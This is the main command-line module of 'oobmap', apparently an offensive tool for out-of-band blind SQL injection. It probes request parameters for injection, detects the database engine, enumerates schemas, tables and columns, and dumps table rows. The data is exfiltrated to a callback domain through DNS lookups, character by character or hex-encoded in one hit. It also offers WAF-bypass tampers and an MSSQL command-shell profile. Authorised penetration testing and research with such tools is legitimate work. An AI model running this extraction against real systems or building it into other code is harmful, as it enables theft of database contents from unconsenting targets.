import argparse
import copy
import csv
import datetime
import io
import json
import string
import sys
import uuid
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path

from . import __version__
from .dbms import DBMS
from .oob import InteractshLog, MultiInteractshLog
from .payloads import PROFILES
from .requester import current_value, inject, injection_points, parse_raw_request, send
from .session import SessionStore
from .tamper import TAMPERS, apply_tampers


DEFAULT_ALPHABET = string.ascii_lowercase + string.digits


def _ts() -> str:
    return datetime.datetime.now().strftime("%H:%M:%S")


_LEVEL_COLORS = {
    "INFO":    "\033[1;34m",   # bold blue
    "WARNING": "\033[1;33m",   # bold yellow
    "ERROR":   "\033[1;31m",   # bold red
    "DEBUG":   "\033[0;90m",   # dark grey
    "SUCCESS": "\033[1;92m",   # bold bright green
}
_RESET = "\033[0m"


def _log(level: str, msg: str, *, err: bool = False) -> None:
    fd = sys.stderr if err else sys.stdout
    if fd.isatty():
        color = _LEVEL_COLORS.get(level, "")
        tag = f"{color}[{level}]{_RESET}"
    else:
        tag = f"[{level}]"
    print(f"[{_ts()}] {tag} {msg}", file=fd, flush=True)


def _hi(text: str) -> str:
    if sys.stdout.isatty():
        return f"\033[1;92m{text}\033[0m"
    return text


def _sep() -> None:
    print("  " + "─" * 56)
ENUM_ALPHABET = string.ascii_letters + string.digits + " _-.:/@()[]{}+,;=<>|"


def normalize_domain(domain: str) -> str:
    domain = domain.strip()
    domain = domain.removeprefix("http://").removeprefix("https://")
    return domain.strip("/.")


def token_for(run_id: str, pos: int, char: str) -> str:
    return f"{run_id}-p{pos:02d}-c{ord(char):02x}"


def build_expression(args) -> str:
    if getattr(args, "expr", None):
        return args.expr

    column = getattr(args, "column", None)
    table = getattr(args, "table", None)
    where = getattr(args, "where", None)
    if not (column and table):
        raise SystemExit("dump requires -T/--table and -C/--column")

    if args.dbms in ("mssql", "mssql-cmdshell"):
        expr = f"SELECT TOP 1 {column} FROM {table}"
    else:
        expr = f"SELECT {column} FROM {table}"

    if where:
        expr += f" WHERE {where}"
    if args.dbms not in ("mssql", "mssql-cmdshell"):
        expr += " LIMIT 1"
    return expr


def load_common(args):
    profile = PROFILES[args.dbms]
    request = parse_raw_request(args.request)
    domain = normalize_domain(args.domain)
    log = MultiInteractshLog(args.log) if len(args.log) > 1 else InteractshLog(args.log[0])
    run_id = args.run_id or uuid.uuid4().hex[:6]
    if args.base is None:
        args.base = current_value(request, args.param, args.place)
    session = SessionStore(args.output_dir, request, args.force_ssl, flush=args.flush_session)
    tamper_names = [t.strip() for t in getattr(args, "tamper", "").split(",") if t.strip()]
    unknown = [t for t in tamper_names if t not in TAMPERS]
    if unknown:
        raise SystemExit(f"unknown tamper(s): {', '.join(unknown)}. Run 'oobmap tampers' for the list.")
    return profile, request, domain, log, run_id, session


def send_payload(args, request, payload):
    tamper_names = [t.strip() for t in getattr(args, "tamper", "").split(",") if t.strip()]
    if tamper_names:
        payload = apply_tampers(payload, tamper_names)
    injected = inject(request, args.param, payload, args.place)
    try:
        status, body = send(
            injected,
            force_ssl=args.force_ssl,
            timeout=args.http_timeout,
            proxy=getattr(args, "proxy", None),
            verify_ssl=not getattr(args, "no_verify_ssl", False),
        )
        if args.verbose:
            _log("DEBUG", f"http {status}  {len(body)} bytes")
    except Exception as exc:
        if args.verbose:
            _log("DEBUG", f"http error (ignored): {exc}")


def extract_char_binary(args, profile, request, domain, log, run_id, expression, pos, alphabet):
    chars = sorted(set(alphabet))
    if not chars:
        return None
    lo, hi = 0, len(chars) - 1
    while lo < hi:
        mid = (lo + hi + 1) // 2
        token = f"{run_id}-p{pos:02d}-b{mid:02x}"
        condition = profile.condition_gte(expression, pos, chars[mid])
        payload = profile.payload(args.base, condition, f"{token}.{domain}")
        send_payload(args, request, payload)
        if log.wait_any({token: chars[mid]}, args.timeout):
            lo = mid
        else:
            hi = mid - 1
    # Confirm candidate — absence means end-of-string
    candidate = chars[lo]
    token_eq = f"{run_id}-p{pos:02d}-c{ord(candidate):02x}"
    condition_eq = profile.condition(expression, pos, candidate)
    payload_eq = profile.payload(args.base, condition_eq, f"{token_eq}.{domain}")
    send_payload(args, request, payload_eq)
    return candidate if log.wait_any({token_eq: candidate}, args.timeout) else None


def run_check(args, profile, request, domain, log, run_id) -> int:
    _sep()
    print(f"  profile   {profile.name}  |  run {run_id}")
    print(f"  [~] {profile.comment}")
    print(f"  target    {args.place}:{args.param}")
    print(f"  watching  {', '.join(args.log)}")
    _sep()

    true_token = f"{run_id}-true"
    false_token = f"{run_id}-false"
    true_payload = profile.payload(args.base, args.true_condition, f"{true_token}.{domain}")
    false_payload = profile.payload(args.base, args.false_condition, f"{false_token}.{domain}")

    _log("INFO", "sending true probe …")
    send_payload(args, request, true_payload)
    true_hit = log.wait_any({true_token: "true"}, args.timeout)

    _log("INFO", "sending false probe …")
    send_payload(args, request, false_payload)
    false_hit = log.wait_any({false_token: "false"}, args.timeout)

    if true_hit and not false_hit:
        _log("INFO", _hi("OOB condition confirmed ✓"))
        return 0
    if true_hit and false_hit:
        _log("WARNING", "both probes triggered — OOB capable but not conditional")
        return 2
    _log("WARNING", "no reliable conditional OOB behavior detected")
    return 1


def check(args) -> int:
    if args.param:
        profile, request, domain, log, run_id, session = load_common(args)
        try:
            rc = run_check(args, profile, request, domain, log, run_id)
            status = "confirmed" if rc == 0 else "conditional-failed" if rc == 2 else "not-confirmed"
            session.save_check(session.check_id(args.dbms, args.place, args.param), args.dbms, args.place, args.param, status)
            _log("INFO", f"session: {session.path}")
            return rc
        finally:
            session.close()

    tamper_names = [t.strip() for t in getattr(args, "tamper", "").split(",") if t.strip()]
    unknown = [t for t in tamper_names if t not in TAMPERS]
    if unknown:
        raise SystemExit(f"unknown tamper(s): {', '.join(unknown)}. Run 'oobmap tampers' for the list.")
    profile = PROFILES[args.dbms]
    request = parse_raw_request(args.request)
    domain = normalize_domain(args.domain)
    log = MultiInteractshLog(args.log) if len(args.log) > 1 else InteractshLog(args.log[0])
    session = SessionStore(args.output_dir, request, args.force_ssl, flush=args.flush_session)
    points = injection_points(request, args.level)
    if not points:
        _log("WARNING", "no injection points found at this level")
        session.close()
        return 1

    _log("INFO", f"scanning {len(points)} injection point(s)  level={args.level}")
    found = False
    for point in points:
        candidate_args = copy.copy(args)
        candidate_args.param = point.name
        candidate_args.place = point.place
        candidate_args.base = point.value
        run_id = f"{args.run_id or uuid.uuid4().hex[:6]}-{point.place[:1]}{abs(hash((point.place, point.name))) % 10000}"
        print()
        rc = run_check(candidate_args, profile, request, domain, log, run_id)
        status = "confirmed" if rc == 0 else "conditional-failed" if rc == 2 else "not-confirmed"
        session.save_check(session.check_id(args.dbms, point.place, point.name), args.dbms, point.place, point.name, status)
        if rc == 0:
            _log("INFO", _hi(f"injectable OOB point: --place {point.place} -p {point.name}"))
            found = True
            if args.first:
                break

    _log("INFO", f"session: {session.path}")
    session.close()
    return 0 if found else 1


def _extract_value_parallel(args, profile, request, domain, log, run_id, session,
                             extraction_id, expression, alphabet, max_len,
                             partial_result, start_pos):
    results: dict[int, str | None] = {}
    positions = list(range(start_pos, max_len + 1))

    def extract_one(pos: int) -> tuple[int, str | None]:
        if getattr(args, "strategy", "batch") == "binary":
            return pos, extract_char_binary(
                args, profile, request, domain, log, run_id, expression, pos, alphabet
            )
        token_map: dict[str, str] = {}
        for c in alphabet:
            token = token_for(run_id, pos, c)
            token_map[token] = c
            condition = profile.condition(expression, pos, c)
            payload = profile.payload(args.base, condition, f"{token}.{domain}")
            send_payload(args, request, payload)
        token = log.wait_any(token_map, args.timeout)
        return pos, token_map[token] if token else None

    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        futures = {executor.submit(extract_one, pos): pos for pos in positions}
        for fut in as_completed(futures):
            pos, char = fut.result()
            results[pos] = char

    result = partial_result
    for pos in range(start_pos, max_len + 1):
        char = results.get(pos)
        if not char:
            break
        result += char
        session.save_extraction(
            extraction_id, args.dbms, args.place, args.param,
            expression, alphabet, result, False,
        )
        _log("INFO", f"pos {pos:02d}: {char}  {result}")

    print()
    _log("INFO", f"done  {_hi(result)}")
    session.save_extraction(
        extraction_id, args.dbms, args.place, args.param,
        expression, alphabet, result, True,
    )
    return result


def _try_direct_extract(args, profile, request, domain, log, run_id, expression) -> str | None:
    """Try to exfiltrate the full value in one DNS hit (HEX in subdomain).
    Returns the decoded value, or None if unsupported or no callback received."""
    prefix = f"{run_id}-d"
    payload = profile.direct_payload(args.base, expression, prefix, domain)
    if payload is None:
        return None

    _log("INFO", "trying direct exfiltration (full value in one DNS hit)")
    tamper_names = [t.strip() for t in getattr(args, "tamper", "").split(",") if t.strip()]
    if tamper_names:
        payload = apply_tampers(payload, tamper_names)

    injected = inject(request, args.param, payload, args.place)
    try:
        send(injected, force_ssl=args.force_ssl, timeout=args.http_timeout,
             proxy=getattr(args, "proxy", None),
             verify_ssl=not getattr(args, "no_verify_ssl", False))
    except Exception:
        pass

    value = log.find_direct(prefix, args.timeout)
    if value is not None:
        _log("INFO", _hi(f"direct exfil: {value}"))
    else:
        _log("DEBUG", "no direct callback — falling back to char-by-char")
    return value


def extract_value(args, expression: str, alphabet: str, max_len: int) -> str:
    profile, request, domain, log, run_id, session = load_common(args)
    extraction_id = session.extraction_id(args.dbms, args.place, args.param, expression, alphabet)
    cached = None if args.fresh_queries else session.get_extraction(extraction_id)
    result = ""
    start_pos = 1

    if cached and cached["completed"]:
        _log("INFO", f"resumed completed value from session: {_hi(cached['value'])}")
        session.close()
        return cached["value"]

    if cached and cached["value"]:
        result = cached["value"]
        start_pos = len(result) + 1
        _log("INFO", f"resuming from session at pos {start_pos}: {result}")

    _sep()
    print(f"  profile   {profile.name}  |  run {run_id}")
    print(f"  [~] {profile.comment}")
    print(f"  expr      {expression}")
    print(f"  domain    {domain}")
    print(f"  watching  {', '.join(args.log)}")
    print(f"  session   {session.path}")
    _sep()
    print()

    # Try direct exfiltration first (only when starting fresh, not resuming)
    if start_pos == 1:
        direct = _try_direct_extract(args, profile, request, domain, log, run_id, expression)
        if direct is not None:
            session.save_extraction(extraction_id, args.dbms, args.place, args.param, expression, alphabet, direct, True)
            session.close()
            return direct
        print()

    if getattr(args, "threads", 1) > 1:
        result = _extract_value_parallel(
            args, profile, request, domain, log, run_id, session,
            extraction_id, expression, alphabet, max_len, result, start_pos,
        )
        session.close()
        return result

    for pos in range(start_pos, max_len + 1):
        if getattr(args, "strategy", "batch") == "binary":
            char = extract_char_binary(args, profile, request, domain, log, run_id, expression, pos, alphabet)
        else:
            token_map: dict[str, str] = {}
            for c in alphabet:
                token = token_for(run_id, pos, c)
                token_map[token] = c
                condition = profile.condition(expression, pos, c)
                payload = profile.payload(args.base, condition, f"{token}.{domain}")
                send_payload(args, request, payload)
            token = log.wait_any(token_map, args.timeout)
            char = token_map[token] if token else None

        if not char:
            print()
            _log("INFO", f"done  {_hi(result)}")
            session.save_extraction(extraction_id, args.dbms, args.place, args.param, expression, alphabet, result, True)
            session.close()
            return result

        result += char
        session.save_extraction(extraction_id, args.dbms, args.place, args.param, expression, alphabet, result, False)
        _log("INFO", f"pos {pos:02d}: {char}  {result}")

    print()
    _log("WARNING", f"reached max-len  {_hi(result)}")
    session.save_extraction(extraction_id, args.dbms, args.place, args.param, expression, alphabet, result, False)
    session.close()
    return result


def extract(args) -> int:
    if not args.param:
        raise SystemExit("--expr requires -p/--param")
    expression = build_expression(args)
    extract_value(args, expression, args.alphabet, args.max_len)
    return 0


def dump(args) -> int:
    if not args.param:
        raise SystemExit("--dump requires -p/--param")
    flush_session_once(args)
    dbms = DBMS[args.dbms]
    columns = [column.strip() for column in args.column.split(",") if column.strip()] if args.column else []
    columns = validate_dump_target(args, dbms, columns)

    _log("INFO", f"dumping {args.table} — columns: {', '.join(columns)}")
    if args.database:
        _log("INFO", f"database/schema: {args.database}")
    if args.where:
        _log("INFO", f"where: {args.where}")

    rows = []
    for index in range(args.limit):
        expr = dbms.dump_expression(args.table, columns, index, args.where, args.database)
        print()
        _log("INFO", f"row {index}: {expr}")
        value = extract_value(args, expr, args.alphabet, args.max_len)
        if not value:
            _log("INFO", f"no more rows at index {index}")
            break
        row = split_dump_row(value, len(columns))
        rows.append(row)
        print_dump_row(columns, row)

    if rows:
        formatter = {"table": format_table, "json": format_json, "csv": format_csv}
        output = formatter[args.output_format](columns, rows)

        if args.output_file:
            Path(args.output_file).write_text(output, encoding="utf-8")
            _log("INFO", f"saved to {args.output_file}", err=True)
        else:
            if args.output_format == "table":
                print()
                _log("INFO", "dump result")
            print(output)
    return 0


def split_dump_row(value: str, column_count: int) -> list[str]:
    parts = value.split("|")
    if len(parts) < column_count:
        parts.extend([""] * (column_count - len(parts)))
    if len(parts) > column_count:
        head = parts[: column_count - 1]
        tail = "|".join(parts[column_count - 1 :])
        parts = head + [tail]
    return parts


def print_dump_row(columns: list[str], row: list[str]):
    pairs = [f"{column}={value}" for column, value in zip(columns, row)]
    _log("INFO", ", ".join(pairs))


def print_dump_table(columns: list[str], rows: list[list[str]]):
    widths = [len(column) for column in columns]
    for row in rows:
        widths = [max(width, len(value)) for width, value in zip(widths, row)]
    header = " | ".join(column.ljust(width) for column, width in zip(columns, widths))
    sep = "-+-".join("-" * width for width in widths)
    print(header)
    print(sep)
    for row in rows:
        print(" | ".join(value.ljust(width) for value, width in zip(row, widths)))


def format_table(columns: list[str], rows: list[list[str]]) -> str:
    widths = [len(c) for c in columns]
    for row in rows:
        widths = [max(w, len(v)) for w, v in zip(widths, row)]
    header = " | ".join(c.ljust(w) for c, w in zip(columns, widths))
    sep = "-+-".join("-" * w for w in widths)
    lines = [header, sep] + [" | ".join(v.ljust(w) for v, w in zip(row, widths)) for row in rows]
    return "\n".join(lines)


def format_json(columns: list[str], rows: list[list[str]]) -> str:
    return json.dumps([dict(zip(columns, row)) for row in rows], indent=2)


def format_csv(columns: list[str], rows: list[list[str]]) -> str:
    out = io.StringIO()
    writer = csv.writer(out)
    writer.writerow(columns)
    writer.writerows(rows)
    return out.getvalue()


def enum(args) -> int:
    if not args.param:
        raise SystemExit("enum requires -p/--param")
    flush_session_once(args)
    dbms = DBMS[args.dbms]
    selected = []
    if args.dbs:
        selected.append("dbs")
    for option, key in (
        (args.banner, "banner"),
        (args.current_user, "current_user"),
        (args.current_db, "current_db"),
    ):
        if option:
            selected.append(key)
    if args.tables:
        selected.append("tables")
    if args.columns:
        selected.append("columns")
    if not selected:
        raise SystemExit("enum requires at least one of --dbs, --banner, --current-user, --current-db, --tables, --columns")

    for key in selected:
        if key == "dbs":
            values = enumerate_rows(args, "database", lambda index: dbms.dbs_expression(index))
            save_catalog_values(args, "dbs", values)
            if values:
                _log("INFO", f"databases: {', '.join(values)}")
            continue
        if key == "tables":
            values = enumerate_rows(args, "table", lambda index: dbms.table_expression(index, args.database))
            save_catalog_values(args, "tables", values)
            continue
        if key == "columns":
            if not args.table:
                raise SystemExit("enum --columns requires -T/--table")
            values = enumerate_rows(
                args,
                f"column({args.table})",
                lambda index: dbms.column_expression(args.table, index, args.database),
            )
            save_catalog_values(args, "columns", values, args.table)
            continue

        expr = dbms.metadata_expression(key)
        if expr is None:
            _log("WARNING", f"{key} is not implemented for {args.dbms}")
        else:
            print()
            _log("INFO", f"enum {key}: {expr}")
            value = extract_value(args, expr, args.alphabet, args.max_len)
            _log("INFO", f"{key}: {_hi(value)}")
    return 0


def enumerate_rows(args, label: str, expression_builder) -> list[str]:
    values = []
    print()
    _log("INFO", f"enum {label}s")
    limit = getattr(args, "_catalog_limit", args.limit)
    for index in range(limit):
        try:
            expr = expression_builder(index)
        except ValueError as exc:
            _log("WARNING", str(exc))
            return values

        _log("INFO", f"{label} index {index}: {expr}")
        value = extract_value(args, expr, args.alphabet, args.max_len)
        if not value:
            _log("INFO", f"no more {label}s at index {index}")
            break
        values.append(value)
        _log("INFO", f"{label}[{index}]: {_hi(value)}")
    return values


def validate_dump_target(args, dbms, columns: list[str]) -> list[str]:
    if not args.validate:
        if not columns:
            raise SystemExit("dump without -C/--column requires validation/enumeration; keep --validate enabled or provide -C")
        return columns

    tables = get_or_enumerate_catalog(args, "tables", lambda index: dbms.table_expression(index, args.database))
    if args.table not in tables and args.table.upper() not in [table.upper() for table in tables]:
        raise SystemExit(
            f"table not confirmed in current session/catalog: {args.table}. "
            "Try --fresh-queries, adjust -D/--database, or run enum --tables."
        )

    known_columns = get_or_enumerate_catalog(
        args,
        "columns",
        lambda index: dbms.column_expression(args.table, index, args.database),
        args.table,
    )
    if not columns:
        if not known_columns:
            raise SystemExit(f"no columns discovered for table: {args.table}")
        _log("INFO", f"auto-selected columns from catalog: {', '.join(known_columns)}")
        return known_columns

    known_upper = {column.upper() for column in known_columns}
    missing = [column for column in columns if column.upper() not in known_upper]
    if missing:
        raise SystemExit(
            "column(s) not confirmed in current session/catalog: "
            + ", ".join(missing)
            + ". Try --fresh-queries or run enum --columns -T "
            + args.table
        )
    return columns


def get_or_enumerate_catalog(args, kind: str, expression_builder, table: str | None = None) -> list[str]:
    request = parse_raw_request(args.request)
    session = SessionStore(args.output_dir, request, args.force_ssl, flush=False)
    try:
        cached = None if args.fresh_queries else session.get_catalog(args.dbms, args.database, kind, table)
    finally:
        session.close()
    if cached is not None:
        _log("INFO", f"using cached {kind}: {', '.join(cached) if cached else '(empty)'}")
        return cached

    label = "table" if kind == "tables" else f"column({table})"
    catalog_args = copy.copy(args)
    catalog_args._catalog_limit = getattr(args, "enum_limit", args.limit)
    values = enumerate_rows(catalog_args, label, expression_builder)
    save_catalog_values(args, kind, values, table)
    return values


def save_catalog_values(args, kind: str, values: list[str], table: str | None = None):
    request = parse_raw_request(args.request)
    session = SessionStore(args.output_dir, request, args.force_ssl, flush=False)
    try:
        session.save_catalog(args.dbms, args.database, kind, values, table)
    finally:
        session.close()


def flush_session_once(args):
    if not args.flush_session:
        return
    request = parse_raw_request(args.request)
    session = SessionStore(args.output_dir, request, args.force_ssl, flush=True)
    session.close()
    args.flush_session = False


_ENUM_KEYS = ("dbs", "banner", "current_user", "current_db", "tables", "columns")

# Primary profiles tried during DBMS auto-detection (one per engine, most common first)
_DETECT_ORDER = ["mysql", "mssql", "postgres-program", "oracle-http", "sqlite-lab"]


def _detect_dbms(args) -> str | None:
    request = parse_raw_request(args.request)
    domain = normalize_domain(args.domain)
    log = MultiInteractshLog(args.log) if len(args.log) > 1 else InteractshLog(args.log[0])
    run_id = args.run_id or uuid.uuid4().hex[:6]
    tamper_names = [t.strip() for t in getattr(args, "tamper", "").split(",") if t.strip()]

    candidates = [p for p in _DETECT_ORDER if p in PROFILES]
    _log("INFO", f"--dbms not set — probing {len(candidates)} engines: {', '.join(candidates)}")

    for profile_name in candidates:
        profile = PROFILES[profile_name]
        base = args.base
        if base is None and args.param:
            base = current_value(request, args.param, args.place)
        base = base or ""

        token = f"{run_id}-detect-{profile_name}"
        payload = profile.payload(base, "1=1", f"{token}.{domain}")
        if tamper_names:
            payload = apply_tampers(payload, tamper_names)

        injected = inject(request, args.param or "", payload, args.place)
        try:
            send(injected, force_ssl=args.force_ssl, timeout=args.http_timeout,
                 proxy=getattr(args, "proxy", None),
                 verify_ssl=not getattr(args, "no_verify_ssl", False))
        except Exception:
            pass

        hit = log.wait_any({token: profile_name}, args.timeout)
        if hit:
            _log("INFO", _hi(f"identified DBMS: {profile_name}"))
            return profile_name
        _log("DEBUG", f"no callback — {profile_name}")

    return None


def run(args) -> int:
    if getattr(args, "enum_all", False):
        args.dbs = args.banner = args.current_user = args.current_db = True

    for flag, val in [
        ("-r/--request", getattr(args, "request", None)),
        ("--domain",     getattr(args, "domain",  None)),
        ("--log",        getattr(args, "log",     None)),
    ]:
        if not val:
            raise SystemExit(f"the following argument is required: {flag}")

    if not args.dbms:
        args.dbms = _detect_dbms(args)
        if not args.dbms:
            raise SystemExit(
                "could not auto-detect DBMS — no OOB callback received for any engine. "
                "Specify --dbms explicitly or check your --domain/--log setup."
            )

    is_enum = any(getattr(args, k, False) for k in _ENUM_KEYS)
    if args.alphabet is None:
        args.alphabet = ENUM_ALPHABET if is_enum else DEFAULT_ALPHABET
    if args.max_len is None:
        args.max_len = 120 if is_enum else 40

    if args.expr:
        return extract(args)
    if args.dump:
        return dump(args)
    if is_enum:
        return enum(args)
    return check(args)


_ART = [
    "     ___  ___  ___  __  __   _   ___",
    "    / _ \\/ _ \\| _ )|  \\/  | /_\\ | _ \\",
    "   | (_) | (_) | _ \\ |\\/| |/ _ \\|  _/",
    f"    \\___/ \\___/|___/_|  |_/_/ \\_\\_|    {{v{__version__}}}",
]
_SUBTITLE = "    OOB blind SQLi extractor — powered by interactsh"


def _banner() -> str:
    if sys.stdout.isatty():
        c  = "\033[1;36m"   # bold cyan  — logo
        v  = "\033[1;33m"   # bold yellow — version tag
        s  = "\033[0;37m"   # light grey  — subtitle
        r  = "\033[0m"
        art = "\n".join(
            # color the version tag separately on the last art line
            line.replace(f"{{v{__version__}}}", f"{r}{v}{{v{__version__}}}{r}{c}")
            .join([c, r])
            for line in _ART
        )
        return f"\n{art}\n\n{s}{_SUBTITLE}{r}\n"
    return "\n" + "\n".join(_ART) + f"\n\n{_SUBTITLE}\n"


class _Formatter(argparse.RawDescriptionHelpFormatter):
    def _format_usage(self, usage, actions, groups, prefix):
        return _banner() + f"Usage: {self._prog} [options]\n\n"


def make_parser():
    parser = argparse.ArgumentParser(
        prog="oobmap",
        description=None,
        formatter_class=_Formatter,
    )
    parser.add_argument("--version", action="version", version=f"oobmap {__version__}")
    parser.set_defaults(func=run)

    sub = parser.add_subparsers(dest="command")
    sub.add_parser("profiles", help="list payload profiles").set_defaults(func=profiles)
    sub.add_parser("tampers",  help="list available WAF tamper scripts").set_defaults(func=list_tampers)

    tgt = parser.add_argument_group("Target")
    tgt.add_argument("-r", "--request", metavar="FILE", help="raw HTTP request file")
    tgt.add_argument("-p", "--param", help="parameter/cookie/header name to inject")
    tgt.add_argument(
        "--place",
        choices=["auto", "cookie", "query", "body", "header", "marker", "json"],
        default="auto",
        help="injection place (default: auto); json targets a dotted JSONPath e.g. user.name",
    )
    tgt.add_argument("--dbms", choices=sorted(PROFILES),
                     help="OOB payload profile — run 'oobmap profiles' for descriptions")
    tgt.add_argument("-D", "--database", help="database/schema/catalog for metadata and dump queries")

    oob = parser.add_argument_group("OOB callback")
    oob.add_argument("--domain", help="interactsh collaborator domain")
    oob.add_argument("--log", action="append", metavar="PATH",
                     help="interactsh JSONL log file (repeat: --log a.jsonl --log b.jsonl)")
    oob.add_argument("--timeout", type=float, default=8.0,
                     help="seconds to wait for a callback per probe/position (default: 8)")

    enm = parser.add_argument_group("Enumeration")
    enm.add_argument("-a", "--all", action="store_true", dest="enum_all",
                     help="retrieve everything: banner, current-user, current-db, dbs")
    enm.add_argument("-b", "--banner", action="store_true", help="retrieve DBMS version banner")
    enm.add_argument("--current-user", action="store_true", help="retrieve current database user")
    enm.add_argument("--current-db",   action="store_true", help="retrieve current database/schema name")
    enm.add_argument("--dbs",     action="store_true", help="enumerate accessible databases/schemas")
    enm.add_argument("--tables",  action="store_true", help="enumerate table names")
    enm.add_argument("--columns", action="store_true", help="enumerate column names (requires -T)")
    enm.add_argument("--dump",    action="store_true", help="dump table entries (use with -T/-C/--where)")
    enm.add_argument("--expr", help="raw scalar SQL expression to extract via OOB")
    enm.add_argument("-T", "--table",  help="target table")
    enm.add_argument("-C", "--column", metavar="COL", help="comma-separated column(s) to dump")
    enm.add_argument("--where", help="SQL WHERE clause, e.g. \"username='admin'\"")
    enm.add_argument("--limit",      type=int, default=20, help="max rows/items to fetch (default: 20)")
    enm.add_argument("--enum-limit", type=int, default=50,
                     help="max tables/columns to enumerate during dump validation (default: 50)")
    enm.add_argument("--validate",    dest="validate", action="store_true",  default=True,
                     help="confirm table/columns before dumping (default)")
    enm.add_argument("--no-validate", dest="validate", action="store_false",
                     help="skip catalog validation; requires -C")

    det = parser.add_argument_group("Detection")
    det.add_argument("--level", type=int, choices=range(1, 6), default=1,
                     help="auto-scan depth (no -p): 1=query+body, 2=+cookies, 3=+headers, 5=all (default: 1)")
    det.add_argument("--risk", type=int, choices=(1, 2, 3), default=1,
                     help="risk level 1-3 (sqlmap compat, no current effect)")
    det.add_argument("--true-condition",  default="1=1",
                     help="true SQL condition for check probes (default: 1=1)")
    det.add_argument("--false-condition", default="1=2",
                     help="false SQL condition for check probes (default: 1=2)")
    det.add_argument("--first", action="store_true",
                     help="stop after first confirmed OOB point (check mode)")

    ext = parser.add_argument_group("Extraction")
    ext.add_argument("--strategy", choices=["batch", "binary"], default="batch",
                     help="batch: one request per char (default); binary: ~10x fewer requests")
    ext.add_argument("--threads", type=int, default=1, metavar="N",
                     help="extract N positions in parallel (default: 1; recommended range: 2-4)")
    ext.add_argument("--alphabet", default=None,
                     help=f"chars to test per position (default: a-z0-9 for extract/dump, extended for enum)")
    ext.add_argument("--max-len", type=int, default=None,
                     help="max value length (default: 40 for extract/dump, 120 for enum)")

    waf = parser.add_argument_group("WAF bypass")
    waf.add_argument("--tamper", default="", metavar="NAMES",
                     help="comma-separated tamper chain — run 'oobmap tampers' for the list")

    net = parser.add_argument_group("Network")
    net.add_argument("--force-ssl",    action="store_true", help="send request over HTTPS")
    net.add_argument("--http-timeout", type=float, default=10.0,
                     help="HTTP response timeout in seconds (default: 10)")
    net.add_argument("--proxy", metavar="URL",
                     help="proxy URL — http://host:port (SOCKS5 requires PySocks)")
    net.add_argument("--no-verify-ssl", action="store_true", help="skip TLS certificate verification")
    net.add_argument("--base", help="original parameter value before injection")

    out = parser.add_argument_group("Output")
    out.add_argument("--output-format", choices=["table", "json", "csv"], default="table",
                     dest="output_format", help="dump output format (default: table)")
    out.add_argument("--output-file", metavar="PATH",
                     help="write dump output to file (progress stays on stderr)")

    sess = parser.add_argument_group("Session")
    sess.add_argument("--output-dir",
                      help="session/output directory (default: ~/.local/share/oobmap/output)")
    sess.add_argument("--flush-session",  action="store_true",
                      help="flush session files for current target")
    sess.add_argument("--fresh-queries",  action="store_true",
                      help="ignore cached results without deleting the session")
    sess.add_argument("--run-id", help="fix run ID for reproducible token debugging")

    misc = parser.add_argument_group("Misc")
    misc.add_argument("--batch",    action="store_true", help="non-interactive mode (sqlmap compat)")
    misc.add_argument("-v", "--verbose", action="store_true",
                      help="print HTTP status and payload for each request")

    return parser


def list_tampers(args) -> int:
    for name, (_, description) in sorted(TAMPERS.items()):
        print(f"{name:<22} {description}")
    return 0


def profiles(args) -> int:
    for name in sorted(PROFILES):
        profile = PROFILES[name]
        print(f"{name:16} {profile.description}")
        print(f"{'':16} {profile.comment}")
    return 0


def main(argv=None):
    parser = make_parser()
    args = parser.parse_args(argv)
    if args.command is None and not getattr(args, "request", None):
        parser.print_help()
        return 0
    try:
        return args.func(args)
    except KeyboardInterrupt:
        print()
        _log("WARNING", "interrupted", err=True)
        return 130


if __name__ == "__main__":
    raise SystemExit(main())
